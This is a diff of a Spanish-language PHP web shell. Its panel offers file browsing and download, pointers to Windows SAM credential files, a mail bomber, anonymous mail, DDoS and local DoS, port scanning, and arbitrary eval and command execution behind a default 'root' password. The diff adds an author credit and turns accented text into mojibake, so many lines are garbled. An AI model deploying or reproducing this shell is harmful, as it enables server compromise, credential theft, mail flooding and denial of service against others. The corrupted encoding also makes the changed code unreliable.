@@ -1,5 +1,9 @@
 <?php
 /*
+
+  Izquierdo Vera, javier
+  javierizquierdovera@gmail.com
+
   ______________________________________________________________________________________
  /______________________________________________________________________________________/|
 |   ____             _____________      ____         ____            __________        | |
@@ -23,7 +27,7 @@
 
 @session_start();
 error_reporting(0);
-$password = "63a9f0ea7bb98050796b649e85481845"; //contraseña md5, por defecto: 'root'
+$password = "63a9f0ea7bb98050796b649e85481845"; //contraseé¦» md5, por defecto: 'root'
 
 
 
@@ -78,7 +82,7 @@ if (md5($_POST['pass']) == $password) {
 $_SESSION["login"] = 'ok';
 }
  if ($_SESSION["login"] != 'ok') {
- echo '<div style="text-align: left;"><form method="POST" action=""><span>Contraseña: </span><input type="password" name="pass"><input type="submit" VALUE="Entrar"></form>'; 
+ echo '<div style="text-align: left;"><form method="POST" action=""><span>Contraseé¦»: </span><input type="password" name="pass"><input type="submit" VALUE="Entrar"></form>'; 
 return 0;
 }
 exec('wget --help',$wget);
@@ -132,7 +136,7 @@ text-decoration:none;
 a:hover{
 text-decoration:none;
 }      
-</style> </head><body style="background-color: black; color: rgb(0, 0, 0);" alink="#ee0000" link="#0000ee" vlink="#551a8b"><div style="text-align: center; background-color: rgb(7, 7, 7);"><big><a href="?"><big><big style="font-family: Aharoni;"><big><span style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000">'.$nombre_princi.'</span></big></big></big></a><br></big><hr style="width: 100%; height: 2px;"><big style="color: white;"><a style="color: white;" href="?">Archivos</a> | <a style="color: white;" href="?opcion=info_sistema">Información del sistema</a></big><span style="color: white;"> | <a style="color: white;" href="?opcion=mail">Mail</a> | <a style="color: white;" href="?opcion=dos">DOS</a> | <a style="color: white;" href="?opcion=escaner_puertos">Escanear puertos</a> | <a style="color: white;" href="?opcion=eval">Eval</a> | <a style="color: white;" href="?opcion=encode_decode">Encode/Decode</a> | <a style="color: white;" href="?opcion=salir">Salir</a></span><hr style="width: 100%; height: 2px;"><br><table style="width: 966px; height: 201px; text-align: left; margin-left: auto; margin-right: auto;" border="1" cellpadding="2" cellspacing="2">  <tbody>   <tr><td><span style="color: rgb(167, 167, 167);">';
+</style> </head><body style="background-color: black; color: rgb(0, 0, 0);" alink="#ee0000" link="#0000ee" vlink="#551a8b"><div style="text-align: center; background-color: rgb(7, 7, 7);"><big><a href="?"><big><big style="font-family: Aharoni;"><big><span style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000">'.$nombre_princi.'</span></big></big></big></a><br></big><hr style="width: 100%; height: 2px;"><big style="color: white;"><a style="color: white;" href="?">Archivos</a> | <a style="color: white;" href="?opcion=info_sistema">Informacié«‡ del sistema</a></big><span style="color: white;"> | <a style="color: white;" href="?opcion=mail">Mail</a> | <a style="color: white;" href="?opcion=dos">DOS</a> | <a style="color: white;" href="?opcion=escaner_puertos">Escanear puertos</a> | <a style="color: white;" href="?opcion=eval">Eval</a> | <a style="color: white;" href="?opcion=encode_decode">Encode/Decode</a> | <a style="color: white;" href="?opcion=salir">Salir</a></span><hr style="width: 100%; height: 2px;"><br><table style="width: 966px; height: 201px; text-align: left; margin-left: auto; margin-right: auto;" border="1" cellpadding="2" cellspacing="2">  <tbody>   <tr><td><span style="color: rgb(167, 167, 167);">';
 if (isset($_GET['leer'])) {
 header("Content-Type: application/octet-stream");
 header("Content-Disposition: attachment; filename=".basename($_GET['leer']));
@@ -161,7 +165,7 @@ echo '</textarea>
 	}
 return 0;
  }
-function tamaño($size){
+function tamaé§‰($size){
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
@@ -309,7 +313,7 @@ echo '   </tr>  </tbody></table><br style="color: rgb(153, 153, 153);"><hr style
 exit();
 }
 if ($opcion == 'info_sistema') {
-echo '<div style="text-align: center;"><big><big style="color: white;">Información del sistema</big></big><div style="text-align: left;"><br/><b>&nbsp;&nbsp;<a style="color: white;" href="?opcion=php_info">PHP info</a><span style="color: white;"></b></span><br/><b>&nbsp;&nbsp;Sistema operativo:</b> '.php_uname().'<br/> <b>&nbsp;&nbsp;Servidor:</b> '.$_SERVER['SERVER_SOFTWARE'].'<br/><b>&nbsp;&nbsp;Versión PHP:</b> '.PHP_VERSION.'<br/><b>&nbsp;&nbsp;Espacio:</b> '.tamaño(diskfreespace(getcwd())).'/'.tamaño(disk_total_space(getcwd())).'<br/><b>&nbsp;&nbsp;Nombre del servidor:</b> '.$_SERVER['HTTP_HOST'].'<br/><b>&nbsp;&nbsp;IP:</b> '.$_SERVER['SERVER_ADDR'].'<br/><b>&nbsp;&nbsp;E-mail admin:</b> '.$_SERVER['SERVER_ADMIN'].'<br/><b>&nbsp;&nbsp;Safe Mode:</b> '.$safe.'<br/> <b>&nbsp;&nbsp;cURL:</b> '.(($curl_on)?('Activado'):('Desactivado')).'<br/><b>&nbsp;&nbsp;Perl:</b> '.$perle.'.<br/><b>&nbsp;&nbsp;Magic quotes:</b> '.$magic.'.<br/><b>&nbsp;&nbsp;WGET:</b> '.$wgete.'.<br/><b>&nbsp;&nbsp;Bases de datos activas: </b>'.$base.'<br/>';
+echo '<div style="text-align: center;"><big><big style="color: white;">Informacié«‡ del sistema</big></big><div style="text-align: left;"><br/><b>&nbsp;&nbsp;<a style="color: white;" href="?opcion=php_info">PHP info</a><span style="color: white;"></b></span><br/><b>&nbsp;&nbsp;Sistema operativo:</b> '.php_uname().'<br/> <b>&nbsp;&nbsp;Servidor:</b> '.$_SERVER['SERVER_SOFTWARE'].'<br/><b>&nbsp;&nbsp;Versié«‡ PHP:</b> '.PHP_VERSION.'<br/><b>&nbsp;&nbsp;Espacio:</b> '.tamaé§‰(diskfreespace(getcwd())).'/'.tamaé§‰(disk_total_space(getcwd())).'<br/><b>&nbsp;&nbsp;Nombre del servidor:</b> '.$_SERVER['HTTP_HOST'].'<br/><b>&nbsp;&nbsp;IP:</b> '.$_SERVER['SERVER_ADDR'].'<br/><b>&nbsp;&nbsp;E-mail admin:</b> '.$_SERVER['SERVER_ADMIN'].'<br/><b>&nbsp;&nbsp;Safe Mode:</b> '.$safe.'<br/> <b>&nbsp;&nbsp;cURL:</b> '.(($curl_on)?('Activado'):('Desactivado')).'<br/><b>&nbsp;&nbsp;Perl:</b> '.$perle.'.<br/><b>&nbsp;&nbsp;Magic quotes:</b> '.$magic.'.<br/><b>&nbsp;&nbsp;WGET:</b> '.$wgete.'.<br/><b>&nbsp;&nbsp;Bases de datos activas: </b>'.$base.'<br/>';
 if (file_exists("C:/WINDOWS/repair/sam")) {
 echo '<b>&nbsp;&nbsp;Detectado: </b><a href=?leer=C:/WINDOWS/repair/sam>SAM</a>';
 }
@@ -336,7 +340,7 @@ echo "Puerto cerrado: </b>".$i."<br>";
 }}}
 echo '<br>';
 } elseif ($opcion == 'mail') {
-echo '<div style="text-align: center;"><big><big style="color: white;">Mail</big></big><br><br><br><br> <big><a style="color: white;" href="?opcion=mail_bomber">Mail bomber</a></big> |<big> <a style="color: white;"href="?opcion=mail_anonimo">Mail anónimo</a></big>';
+echo '<div style="text-align: center;"><big><big style="color: white;">Mail</big></big><br><br><br><br> <big><a style="color: white;" href="?opcion=mail_bomber">Mail bomber</a></big> |<big> <a style="color: white;"href="?opcion=mail_anonimo">Mail ané«‡imo</a></big>';
 } elseif ($opcion == 'ddos') {
  echo '<div style="text-align: center;"><big><big style="color: white;">DDOS</big></big><br><br><br><br><form method="post"> <p align="center">URL:  <input name=ddosf size=50 style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"> Time:  <input name=timeddos size=6 value=100000 style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"><br> <input type=submit value="Enviar" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></form></p>';
  if($_POST['ddosf'] && $_POST['timeddos']){
@@ -350,7 +354,7 @@ while (!feof($fp)) {
 fclose($fp);
 }}
 } elseif ($opcion == 'derribar') {
- echo '<div style="text-align: center;"><big><big style="color: white;">Dos local</big></big><br><br><br><br>Si pulsas el botón de abajo puede que el servidor se lagee, caiga o no ocurra nada (depende de la seguridad del mismo), ¿estás seguro?<br/><br/><a style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" href="?opcion=tirar" target="_blank">  ¡¡Tirar!!  </a>
+ echo '<div style="text-align: center;"><big><big style="color: white;">Dos local</big></big><br><br><br><br>Si pulsas el boté«‡ de abajo puede que el servidor se lagee, caiga o no ocurra nada (depende de la seguridad del mismo), ç¸ sté†© seguro?<br/><br/><a style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" href="?opcion=tirar" target="_blank">  ã€€Tirar!!  </a>
 ';
  } elseif ($opcion == 'encode_decode') {
 echo '<div style="text-align: center;"><big><big style="color: white;">Encode/decode</big></big><br><br>';
@@ -476,7 +480,7 @@ if ($tipoende=='MD5 - encode') {
  $tipoe = $tipoende; }
 echo '<FORM METHOD="POST" NAME="consola" ACTION=""><span style="font-weight: bold;">'.$tipoe.':</span><br><textarea cols=70 rows=5 NAME="cadena" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000">'.$resultado.'</textarea><br><select name="tipoende" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"><option selected>MD5 - encode</option><option>MD4 - encode</option><option>SHA1 - encode</option><option>SHA256 - encode</option><option>SHA384 - encode</option><option>SHA512 - encode</option><option>ripemd128 - encode</option><option>ripemd160 - encode</option><option>ripemd256 - encode</option><option>ripemd320 - encode</option><option>whirlpool - encode</option><option>tiger128,3 - encode</option><option>tiger160,3 - encode</option><option>tiger192,3 - encode</option><option>tiger128,4 - encode</option><option>tiger160,4 - encode</option><option>tiger192,4 - encode</option><option>snefru - encode</option><option>gost - encode</option><option>adler32 - encode</option><option>crc32 - encode</option><option>haval128,3 - encode</option><option>haval160,3 - encode</option><option>haval192,3 - encode</option><option>haval224,3 - encode</option><option>haval256,3 - encode</option><option>haval128,4 - encode</option><option>haval160,4 - encode</option><option>haval192,4 - encode</option><option>haval224,4 - encode</option><option>haval256,4 - encode</option><option>haval128,5 - encode</option><option>haval160,5 - encode</option><option>haval192,5 - encode</option><option>haval224,5 - encode</option><option>haval256,5 - encode</option><option>Base64 - encode</option><option>Base64 - decode</option><option>URL - encode</option><option>URL - decode</option></select> <INPUT TYPE="submit" VALUE="Enviar" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></FORM><pre></div>';
 } elseif ($opcion == 'mail_bomber') {
-echo '<div style="text-align: center;"><big><big style="color: white;">Mail Bomber</big></big><div style="text-align: left;"><br><form action="" method="post">  <center> <table border="1">    <table width="51%">      <tr>      <td>Destinatario:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>        <td><input name="destinatario" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>     </tr>      <tr>       <td>Remitente:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>        <td><input name="remitente" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>    </tr>    <tr>       <td>Nombre:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>       <td><input name="nombreremitente" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>      </tr>      <tr>       <td>Asunto:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>      <td><input name="asunto" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>     </tr>    <tr>       <td>Cantidad:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>        <td><input name="cantidad" value="200" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td> </tr>  <tr>       <td>Mensaje:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>    <td><textarea name="mensaje" rows="6" cols="40" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></textarea></td>    </tr>     <tr>      </tr>    </tbody> </table><br><br><input name="enviar" value="¡¡Bombardear!!" type="submit" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></p> </form><br/>';
+echo '<div style="text-align: center;"><big><big style="color: white;">Mail Bomber</big></big><div style="text-align: left;"><br><form action="" method="post">  <center> <table border="1">    <table width="51%">      <tr>      <td>Destinatario:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>        <td><input name="destinatario" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>     </tr>      <tr>       <td>Remitente:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>        <td><input name="remitente" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>    </tr>    <tr>       <td>Nombre:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>       <td><input name="nombreremitente" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>      </tr>      <tr>       <td>Asunto:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>      <td><input name="asunto" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td>     </tr>    <tr>       <td>Cantidad:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>        <td><input name="cantidad" value="200" size="42" type="text" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></td> </tr>  <tr>       <td>Mensaje:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>    <td><textarea name="mensaje" rows="6" cols="40" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></textarea></td>    </tr>     <tr>      </tr>    </tbody> </table><br><br><input name="enviar" value="ã€€Bombardear!!" type="submit" style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></p> </form><br/>';
 if (isset($_POST['enviar'])) {
 $need .="MIME-Version: 1.0\n";
 $need .="Content-type: text/html ; charset=iso-8859-1\n";
@@ -566,7 +570,7 @@ echo "</center><br/><br/>  ";
 ?>
   <?=$error;?>	
 			<div style="text-align: center;"><big><big
- style="color: white;">Mail anónimo</big></big><div style="text-align: left;">
+ style="color: white;">Mail ané«‡imo</big></big><div style="text-align: left;">
             <form  method="post" name="contFrm" id="contFrm" action="">
 </br>	
 			<table
@@ -604,7 +608,7 @@ echo "</center><br/><br/>  ";
 session_destroy();
 echo '<div style="text-align: center;"><big>Todas lassesiones se han borrado correctamente</big></div>';
 } elseif ($opcion == 'eval') {
-echo "<div style='text-align: center;'><big><big style='color: white;'>Eval</big></big><br/><br/><form action='' method=POST><b>Código:</b><br/> <textarea  cols='47' rows='4' name=codigo style='color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000'>echo 'Lifka';";
+echo "<div style='text-align: center;'><big><big style='color: white;'>Eval</big></big><br/><br/><form action='' method=POST><b>Céª´igo:</b><br/> <textarea  cols='47' rows='4' name=codigo style='color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000'>echo 'Lifka';";
 echo '</textarea><br/><input type=submit name=cargar value=Enviar style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"></form>';
 if (isset($_POST['cargar'])) {
 echo "<br/><br/>";
@@ -614,7 +618,7 @@ echo "<br/><br/><br/>
 }} else {
 			$homedir=getcwd();
 			$dir=realpath($_GET['dir'])."/";
-echo '<div style="text-align: center;"><big><big style="color: white;">Gestión de archivos</big></big><div style="text-align: left;"><br/> &nbsp;&nbsp;<b>Shell:</b> '.$shelldir.'<br/>&nbsp;&nbsp;<b>Home:</b>'.$homedir.'/<br/>&nbsp;&nbsp;<b>Actual:</b>'.$dir.'<br/>';
+echo '<div style="text-align: center;"><big><big style="color: white;">Gestié«‡ de archivos</big></big><div style="text-align: left;"><br/> &nbsp;&nbsp;<b>Shell:</b> '.$shelldir.'<br/>&nbsp;&nbsp;<b>Home:</b>'.$homedir.'/<br/>&nbsp;&nbsp;<b>Actual:</b>'.$dir.'<br/>';
 $dir = opendir($path);
 echo "<b>&nbsp;&nbsp;Drives detectados: </b>"; foreach($scan as $drives) {
 $drives = $drives.":\\";
@@ -627,7 +631,7 @@ echo "&nbsp;&nbsp;"."<a href=?dir=".$drives.">".$drives."</a><br/><br/>";
 if ($drives == "") {
 	echo 'Ninguno.'; }	
     
-	echo 'Función desactivada...';
+	echo 'Funcié«‡ desactivada...';
 if($_GET['cmd']) {
 echo '<hr style="width: 100%; height: 2px;">';
 $modo = $_GET[modo];
